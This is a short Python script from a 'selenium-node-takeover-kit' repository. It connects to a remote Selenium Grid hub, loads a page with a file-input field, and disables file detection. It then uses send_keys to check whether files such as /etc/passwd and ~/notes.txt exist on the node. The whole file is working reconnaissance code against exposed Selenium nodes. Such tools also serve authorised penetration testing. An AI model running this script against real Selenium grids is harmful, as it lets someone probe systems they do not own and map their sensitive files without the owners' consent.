#!/usr/bin/env python
# https://github.com/JonStratton/selenium-node-takeover-kit/blob/master/examples/selenium_node_iterate_fs.py
# 
# Just a tweak to the FileDetector sent_keys so we can check a bunch of files with one connection.

import sys, getopt
from selenium import webdriver
from selenium.webdriver.remote.file_detector import UselessFileDetector

hub_url = None
myopts, args = getopt.getopt(sys.argv[1:],':u:')
for o, a in myopts:
    if o == '-u':
        hub_url = a
 
# Only ~ and absult paths seem to work here
files = ['~/notes.txt', '/etc/passwd', '/does/not/exist', '/bin/ls']

driver = webdriver.Remote(
   command_executor=hub_url,
   desired_capabilities={'browserName': 'firefox'}
   )
driver.file_detector = UselessFileDetector()

try:
    driver.get('data:text/html;charset=utf-8,<html><input id=f type=file></html>')
    for f in files:
        try:
           driver.find_element_by_id('f').send_keys(f)
           print('Exists: %s' % f)
        except:
           print('Doesnt Exist: %s' % f)
finally:
    driver.quit()

sys.exit(0)
